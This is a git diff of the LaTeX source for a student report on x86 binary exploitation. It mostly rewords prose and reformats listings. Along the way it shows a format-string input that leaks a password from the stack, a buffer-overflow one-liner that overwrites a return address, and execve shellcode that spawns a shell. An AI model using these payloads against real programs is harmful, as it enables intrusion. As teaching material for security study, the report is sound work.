@@ -5,7 +5,13 @@
 \author{Alex Hirsch \and Patrick Ober}
 \date{2016-01-31}
 
-\newminted{nasm}{fontsize=\scriptsize,frame=leftline,framesep=2mm,linenos}
+\usepackage{wrapfig}
+\newminted{nasm}{
+    fontsize=\scriptsize,
+    frame=leftline,
+    framesep=2mm,
+    autogobble,
+    linenos}
 
 \begin{document}
 
@@ -30,91 +36,99 @@ license\footnote{\url{https://creativecommons.org/licenses/by-nc/4.0/legalcode}}
 We reused a lot of their material in this project.
 
 We highly recommend checking them out and having a look at their material for
-further details.
+further details apart from the given references.
 
 \section{Introduction}
 
-Exploiting binaries was comparatively easy in the early days of computing.
-Usually there were no special mitigation techniques in place trying to prevent
-even the most simplest exploits. This is the point in time where we will start
-of. First we talk about two very simple exploits, namely the Format String
-Exploit and the Buffer Overflow in combination with Shell Code. Note that there
-is a huge collection of exploitation techniques known to the public and we will
-thereby only look at a very small fraction of them.
+Exploiting binaries was comparatively easy ten to fifteen years ago. There were
+no special mitigation mechanisms in place denying even the most simplest
+exploits. This is the point in time where we will start of. First we talk about
+two very simple exploits, namely the Format String Exploit and the Buffer
+Overflow in combination with Shell Code. Although there is a huge collection of
+exploitation techniques known to the public, we will only look at a very small
+fraction of them in this project.
 
-But before we can introduce these two exploits, some background knowledge is
-required. This will be handled by the next section, which provides a short
-overview of the relevant components in our target architecture, the x86
-platform.
+The next section will communicate necessary background knowledge required to
+fully grasp the two presented exploits. A short overview about the target
+architecture x86 will be given.
 
-After that both techniques are introduced to the reader, followed by the first
-mitigation technique, Data Execution Prevention (DEP). From there on we will
-keep on using the buffer overflow technique with some adaptations to circumvent
-DEP. At this point Return Oriented Programming (ROP) is introduced.
-
-This directly leads to Address Space Layout Randomization (ASLR) the next
-mitigation mechanism we will discuss. Again the buffer overflow technique can
-be adapted to break ASLR through the use of additional information.
+After that, both techniques are introduced, followed by the first mitigation
+technique, Data Execution Prevention (DEP). From there on we will keep on using
+the buffer overflow technique with some adaptations to circumvent DEP. At that
+point Return Oriented Programming (ROP) is introduced, directly leads to
+Address Space Layout Randomization (ASLR) the follow-up mitigation mechanism.
+Again the buffer overflow technique can be adapted to break ASLR through the
+use of additional information.
 
 Since neither DEP nor ASLR provide significant protection against even this
-simple technique, an additional mitigation is put into place in the form of
-Stack Cookies.
+simple technique, an additional mitigation has been put into place in the form
+of Stack Cookies.
 
-Examples will be provided along the way to support the reader and provide some
-additional explanation.
+An outlook will be given after bypassing Stack Cookies by looking at Control
+Flow Integrity (CFI).
 
-Control Flow Integrity (CFI), Heap Corruption and polymorphic code will follow
-in a more compressed manner to communicate the main idea behind each of them.
-
-Finally we will conclude with a word about other architectures (x86\_64 and
-ARM) and a lookout that even languages considered secure have their own set of
-exploitation techniques an attacker could leverage.
+Examples will be provided along the way support the reader and provide some
+additional explanation. Finally we will conclude with a word about other
+architectures (x86\_64 and ARM) followed by a recap about this project.
 
 \subsection{Main Assumption}
 
 Throughout this work we assume that we know the target binary (and the
 libraries it uses). Let us show that this assumption is quite reasonable to
 make by looking through the eyes of the adversary. An attacker who wants to
-penetrate a target machine and get control over it would most likely choose the
-easiest path, by exploiting the weakest link. Most machines relevant to an
-attackers interest will run provide multiple services. For example, while the
-main server of a small business company may run a homemade communication server
-for interaction between them and their clients, it may also run a standard web
-server. Sending a misspelled request to the server may lead following response:
+penetrate a target machine would most likely choose the easiest path, by
+exploiting the weakest link. Most machines relevant to an attacker's interest
+will provide multiple services. Consider following scenario:
 
-\begin{pre*}{autogobble,xleftmargin=1cm}
-    <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
-    <html><head>
-    <title>400 Bad Request</title>
-    </head><body>
-    <h1>Bad Request</h1>
-    <p>Your browser sent a request that this server could not understand.<br />
-    </p>
-    <hr>
-    <address>Apache/2.2.22 (Ubuntu) Server at ovinnik.canonical.com Port 80</address>
-    </body></html>
-    Connection closed by foreign host.
-\end{pre*}
+The main server of a small business company runs a homemade communication
+service for interaction between them and their clients. The attacker has no
+access to the source or binary of this communication service's daemon running
+on the target machine. But along with it a commonly used web server is
+listening on port 80. Getting the source (and binary) of the web server is much
+easier therefore an attacker would pick this entry point over the communication
+service daemon.
 
-The web server tells us his exact version and since it also provides
-information about the operating system an attacker can easily copy the basic
-setup to test and tweak his exploits.
+\begin{listing}[h!]
+    \begin{code*}{linenos=false}
+        <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+        <html><head>
+        <title>400 Bad Request</title>
+        </head><body>
+        <h1>Bad Request</h1>
+        <p>Your browser sent a request that this server could not understand.<br />
+        </p>
+        <hr>
+        <address>Apache/2.2.22 (Ubuntu) Server at ovinnik.canonical.com Port 80</address>
+        </body></html>
+        Connection closed by foreign host.
+    \end{code*}
+    \caption{A web server's response to a misspelled request}
+    \label{src:http_response}
+\end{listing}
+
+\Cref{src:http_response} shows a possible response of a web server when
+receiving an invalid request. The web server tells us his exact version and
+since it also provides information about the operating system (distribution) an
+attacker can easily mimic this setup to test and tweak his exploits. Exploits
+may already be known to the public if the used version is not up-to-date. An
+attacker could easily reuse them.
 
 \section{Platform x86}
 
 This section will teach necessary background knowledge about the target
 platform to fully conceive the following techniques. But first let us elaborate
-why x86 has been chosen in the first place.
+why x86 has been chosen.
 
-At the time these techniques (and the related mitigations) were established,
-x86 was the most common platform. Since most exploits easily translate over
-from x86 to other architectures, especially x86\_64 which very common nowadays.
-Also, most material found on the internet regarding this and related topics
-cover x86.
+At the time these techniques (and their related mitigations) were established,
+x86 was the most common platform. The majority of related material found on the
+internet covers x86, and many exploitation techniques can be translated from
+x86 to other architectures with ease.
 
-More detailed explanations can be found on
-Wikipedia\footnote{\url{https://en.wikipedia.org/wiki/X86}} or the Intel
-Manual\footnote{\url{https://www-ssl.intel.com/content/www/us/en/processors/architectures-software-developer-manuals.html}}.
+A more detailed overview can be found on
+Wikipedia\footnote{\url{https://en.wikipedia.org/wiki/X86}} and if this is not
+enough for you, consider the Intel
+Manual\footnote{\url{https://www-ssl.intel.com/content/www/us/en/processors/architectures-software-developer-manuals.html}}
+for a more profound insight.
 
 \subsection{CPU and registers}
 
@@ -128,11 +142,11 @@ Manual\footnote{\url{https://www-ssl.intel.com/content/www/us/en/processors/arch
 \Cref{fig:registers} (from
 Wikipedia\footnote{\url{https://en.wikipedia.org/w/index.php?title=X86&oldid=696308590\#/media/File:Table_of_x86_Registers_svg.svg}})
 shows an overview of registers available on the x86 platform. While there are
-dedicated registers for floating pointer operations and also special registers
-which hardware protection (segment registers) we will only focus on nine most
-commonly used registers.
+dedicated registers for floating pointer operations and registers with hardware
+protection (segment registers) we will only focus on nine commonly used
+registers.
 
-\begin{minipage}[t]{0.5\textwidth}
+\begin{minipage}[t]{0.4\textwidth}
     \begin{description}
         \item[\texttt{EAX}] Accumulator Register
         \item[\texttt{EBX}] Base Register
@@ -145,44 +159,47 @@ commonly used registers.
         \item[\texttt{EIP}] Instruction Pointer
     \end{description}
 \end{minipage}
-\begin{minipage}[t]{0.45\textwidth}
+\begin{minipage}[t]{0.6\textwidth}
     \begin{figure}[H]
-        \includegraphics[width=\textwidth]{gfx/single_register.png}
+        \centering
+        \includegraphics[width=0.8\textwidth]{gfx/single_register.png}
         \caption{Addressing specific parts of a register including \SI{64}{\bit} extension}
         \label{fig:single_register}
     \end{figure}
 \end{minipage}
 \bigskip
 
-The instruction pointer \texttt{EIP} points to the next instruction located in
-memory which is going to be executed on the cycle. Stack pointer \texttt{ESP} and base
-pointer \texttt{EBP} are used for stack management which is vital to call and
-return from multiple functions properly. The remaining six registers are used
-for computation and passing arguments for system calls. Their values can either
-be interpreted as integers or pointers.
+The instruction pointer \texttt{EIP} points to the next instruction in memory
+which will be executed the subsequent cycle. Stack pointer \texttt{ESP} and
+base pointer \texttt{EBP} are used for stack management which is vital to call
+and return from multiple functions properly. The remaining six registers are
+used for arithmetic and memory operations as well as passing arguments
+(parameters) for system calls. Their values can either be interpreted as
+integers or pointers.
 
 Note that these registers can be addressed partially allowing one to write only
-to the lower \SI{16}{bit} for example as displayed in
+to the lower \SI{16}{bit}, for example, as displayed in
 \cref{fig:single_register} taken from \textit{null
 programm}\footnote{\url{http://nullprogram.com/img/x86/register.png} on
 December of 2015}.
 
 The CPU comes with protection mechanisms which allows the operating system
-kernel to limit the privileges of other processes. This mechanism is known as
+kernel to limit other processes' privileges. This mechanism is known as
 \textit{protection rings} (Ring 0 -- Ring 3). The kernel runs \emph{in} Ring 0
 (most privileged) and switches to Ring 3 (least privileged) when a normal
-process is scheduled. A system call has to be made by the process if it needs
-something which goes beyond its scope. The kernel takes over, deals with the
-request and returns execution back to the process. This is known as
-\textit{context switch} and switching between Rings happens along the way.
+process is scheduled. A system call is invoked by the process if it needs
+something beyond its scope. The kernel takes over, deals with the request and
+returns execution back to the process. This is known as \textit{context switch}
+and switching between Rings happens along with it.
 
 \subsection{System Calls}
 
 As already mentioned in the previous paragraph, a process only has limited
 capabilities and the kernel has to take over to fulfill certain (more
 privileged) operations. The operating system's documentation tells you which
-system calls are available (on which platform) and what additional parameters
-they require. Let us illustrate this with an example: On x86 the Linux system
+system calls are available (on which platform) and what parameters
+each of them requires. Let us illustrate this with an example: On x86 Linux the
+system call
 number 4 (starting from 0) is the \texttt{sys\_write} system call which writes
 data to a file descriptor. It takes three arguments, the file descriptor to
 write to, a pointer to the start of the data which should be written and the
@@ -191,34 +208,35 @@ parameters are placed in the \texttt{EAX}, \texttt{EBX}, \texttt{ECX},
 \texttt{EDX} respectively. To invoke the system call issue following
 instruction:
 
-\begin{nasmcode*}{autogobble,xleftmargin=1cm,linenos=false}
+\begin{nasmcode*}{linenos=false}
     int     0x80
 \end{nasmcode*}
 
-Nowadays you may encounter a different mechanism for system calls, the Virtual
-Dynamic Shared Objects (vDSO) mechanism. This goes beyond our scope here, we
-will use the previously mentioned mechanism in our exploits. If interested, you
-may want to look at the related man
-page\footnote{\url{http://man7.org/linux/man-pages/man7/vdso.7.html}}.
+Nowadays you may encounter a different mechanism for system calls using Virtual
+Dynamic Shared Objects (vDSO). This goes beyond our scope here, we will use the
+previously mentioned mechanism in our exploits as they work side by side.
+Consult the corresponding man
+page\footnote{\url{http://man7.org/linux/man-pages/man7/vdso.7.html}} for
+further reading.
 
 \subsection{Memory}
 
 Physical memory is managed by the operation system kernel by utilising the
 Memory Management Unit (MMU). Each process' address space is virtualized and
-memory operations are translated on-the-fly by the MMU. The physical memory is
+memory operations are translated on-the-fly by the MMU. Physical memory is
 segmented into \textit{pages} (typically \SI{4}{\kibi\byte} in size) and each
-page can be mapped into the virtual address space of one or more (shared)
-processes.~\cite[pp.~400]{unix_interals}
+page can be mapped \emph{into} the virtual address space of one or more
+(shared) processes.~\cite[pp.~400]{unix_interals}
 
 The main parts located inside the (virtual) address space of a process are the
 executable itself with its \texttt{.text} and \texttt{.data} section, the heap
-used for dynamic data, the stack used for local variables and function calling
-and used libraries.
+(used for dynamic data), the stack (used for local variables and function
+calling) and libraries.
 
 \subsection{Endianness}
 \label{sub:endianness}
 
-\begin{figure}[t]
+\begin{figure}[H]
     \centering
     \includegraphics[width=0.35\textwidth]{gfx/little_endian.pdf}
     \caption{Placement of bytes in memory in little-endian}
@@ -226,21 +244,25 @@ and used libraries.
 \end{figure}
 
 Endianness refers to the byte order used when storing data in memory (or
-transmitting it over the network). \Cref{fig:little_endian} (from
-Wikipedia\footnote{\url{https://en.wikipedia.org/w/index.php?title=Endianness&oldid=696417697\#/media/File:Little-Endian.svg}})
-illustrates that the least significant byte of a word is placed at the lower
-memory address and successive bytes are placed as the memory address increases.
+transmitting it over the network). x86 uses little-endian which is described in
+\cref{fig:little_endian} (from
+Wikipedia\footnote{\url{https://en.wikipedia.org/w/index.php?title=Endianness&oldid=696417697\#/media/File:Little-Endian.svg}}).
+The least significant byte of a word is placed at the lower memory address and
+successive bytes are placed as the memory address increases. We will later
+refer back to this when needed. The related Wikipedia
+page\footnote{\url{https://en.wikipedia.org/wiki/Endianness}} goes into more
+detail about this than we need.
 
 \subsection{Calling Convention}
 \label{sub:calling_convention}
 
 A calling convention defines how function calls should be implemented. What
-calling convention is used depends on the platform, toolchain and (compiler)
+calling convention is used depends on the platform, toolchain and compiler
 settings. Let us exhibit what the convention defines and what convention we are
-using.
+using (cdecl).
 
-\begin{minipage}[t]{0.47\textwidth}
-    Defines:
+\begin{minipage}[t]{0.48\textwidth}
+    Convention defines:
     \begin{itemize}
         \item Where to place arguments
         \item Where to place return value
@@ -250,8 +272,8 @@ using.
         \item Who cleans up\\
             (caller or callee)
     \end{itemize}
-\end{minipage}
-\begin{minipage}[t]{0.47\textwidth}
+\end{minipage}\hfill
+\begin{minipage}[t]{0.48\textwidth}
     C Declaration (cdecl):
     \begin{itemize}
         \item Arguments on stack (reverse order)\\
@@ -287,26 +309,24 @@ the format string to derive how many arguments have been supplied. Calling
 assumes that (at least) three arguments have been provided.
 
 \begin{listing}[h!]
-    \begin{minipage}[t]{0.47\textwidth}
+    \begin{minipage}[t]{0.4\textwidth}
         \cfile{../format_string/main.c}
-    \end{minipage}
-    \begin{minipage}[t]{0.47\textwidth}
-        \begin{pre*}{autogobble}
+    \end{minipage}\hfill
+    \begin{minipage}[t]{0.5\textwidth}
+        \begin{code*}{linenos=false}
             > echo foobar | ./main
             You entered:
             foobar
-        \end{pre*}
-        \medskip
-        \begin{pre*}{autogobble}
+
+
             > echo AAAABBBB | ./main
             correct
-        \end{pre*}
-        \medskip
-        \begin{pre*} {autogobble}
+
+
             > echo '%08x' | ./main
             You entered:
             bfd98ed4
-        \end{pre*}
+        \end{code*}
     \end{minipage}
     \caption{Program vulnerable to Format String Exploits}
     \label{src:format_string_exploit}
@@ -327,10 +347,10 @@ wants to get a hold of the hardcoded password stored in \texttt{passwd}. Since
 local variables are placed on the stack \texttt{printf} will be able to read
 the password if enough formatters are provided:
 
-\begin{pre*} {autogobble}
+\begin{code*}{linenos=false}
     > python -c 'print "%08x." * 10' | ./main
     bf920c14.00000064.b77de29e.00000000.00000000.b77fedf8.bf920d94.00000000.41414141.42424242.
-\end{pre*}
+\end{code*}
 
 Here we use Python to craft the format string for us. As we can see the
 password is printed (ASCII encoded). Byte order is swapped because of
@@ -383,7 +403,12 @@ But since this is pretty forward lets go beyond that and see what happens when
 changing the return address.
 
 \begin{listing}[h!]
-    \cfile{../overflow/overflow.c}
+    \begin{minipage}[t]{0.4\textwidth}
+        \cfile{../overflow/overflow.c}
+    \end{minipage}\hfill
+    \begin{minipage}[t]{0.5\textwidth}
+        \codefile{../overflow/objdump.txt}
+    \end{minipage}
     \caption{Program vulnerable to buffer overflows}
     \label{src:buffer_overflow}
 \end{listing}
@@ -393,62 +418,19 @@ As shown in \cref{src:buffer_overflow} we have a buffer suited for
 we will be able to overwrite the return address. Lets have a look at the
 resulting binary utilizing \texttt{objdump}.
 
-\begin{pre}
-0804849b <mordor>:
- 804849b:   55                      push   %ebp
- 804849c:   89 e5                   mov    %esp,%ebp
- 804849e:   83 ec 08                sub    $0x8,%esp
- 80484a1:   83 ec 0c                sub    $0xc,%esp
- 80484a4:   68 c0 85 04 08          push   $0x80485c0
- 80484a9:   e8 b2 fe ff ff          call   8048360 <puts@plt>
- 80484ae:   83 c4 10                add    $0x10,%esp
- 80484b1:   90                      nop
- 80484b2:   c9                      leave
- 80484b3:   c3                      ret
-
-080484b4 <echo>:
- 80484b4:   55                      push   %ebp
- 80484b5:   89 e5                   mov    %esp,%ebp
- 80484b7:   83 ec 28                sub    $0x28,%esp
- 80484ba:   c7 45 e4 00 00 00 00    movl   $0x0,-0x1c(%ebp)
- 80484c1:   c7 45 e8 00 00 00 00    movl   $0x0,-0x18(%ebp)
- 80484c8:   c7 45 ec 00 00 00 00    movl   $0x0,-0x14(%ebp)
- 80484cf:   c7 45 f0 00 00 00 00    movl   $0x0,-0x10(%ebp)
- 80484d6:   c7 45 f4 00 00 00 00    movl   $0x0,-0xc(%ebp)
- 80484dd:   83 ec 0c                sub    $0xc,%esp
- 80484e0:   68 e8 85 04 08          push   $0x80485e8
- 80484e5:   e8 76 fe ff ff          call   8048360 <puts@plt>
- 80484ea:   83 c4 10                add    $0x10,%esp
- 80484ed:   83 ec 08                sub    $0x8,%esp
- 80484f0:   8d 45 e4                lea    -0x1c(%ebp),%eax
- 80484f3:   50                      push   %eax
- 80484f4:   68 f4 85 04 08          push   $0x80485f4
- 80484f9:   e8 92 fe ff ff          call   8048390 <__isoc99_scanf@plt>
- 80484fe:   83 c4 10                add    $0x10,%esp
- 8048501:   83 ec 08                sub    $0x8,%esp
- 8048504:   8d 45 e4                lea    -0x1c(%ebp),%eax
- 8048507:   50                      push   %eax
- 8048508:   68 f7 85 04 08          push   $0x80485f7
- 804850d:   e8 3e fe ff ff          call   8048350 <printf@plt>
- 8048512:   83 c4 10                add    $0x10,%esp
- 8048515:   90                      nop
- 8048516:   c9                      leave
- 8048517:   c3                      ret
-\end{pre}
-
 Looking at lines XX, XX and XX we can infer that the buffer will start
 \SI{28}{\byte} (\texttt{0x1c}) before the base pointer. Hence we have to supply
 \SI{32}{\byte} (28 + 4) of arbitrary data followed by the address where we want
 to jump to. Lets jump into the function \texttt{mordor} located at
 \texttt{0x804849b}, keep in mind that the byte order needs to be swapped.
 
-\begin{pre}
+\begin{code*}{linenos=false}
 > python -c "print 'A'*32 + '\x9b\x84\x04\x08'" | ./overflow
 Enter text:
 You entered: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��
 One does not simply jump into mordor()!
 Segmentation fault (core dumped)
-\end{pre}
+\end{code*}
 
 And the function \texttt{mordor} has been executed, despite the segmentation
 fault one can see that return address has been overwritten successfully.
@@ -463,7 +445,7 @@ exploit. Provided instructions will be executed upon return. Shell code is a
 piece of (binary) code which opens up a shell that reads and executes commands
 from an attacker. Lets start this section by crafting some shell code.
 
-\begin{nasmcode*}{autogobble,xleftmargin=1em}
+\begin{nasmcode}
     xor     eax, eax    ;Clearing eax register
     push    eax         ;Pushing NULL bytes
     push    0x68732f2f  ;Pushing //sh
@@ -476,7 +458,7 @@ from an attacker. Lets start this section by crafting some shell code.
                         ;of /bin//sh byte
     mov     al, 11      ;syscall number of execve is 11
     int     0x80        ;Make the system call
-\end{nasmcode*}
+\end{nasmcode}
 
 This piece of assembly sets up the parameters for the \texttt{execve} system
 call and than invokes to replace the currently running process with a shell.
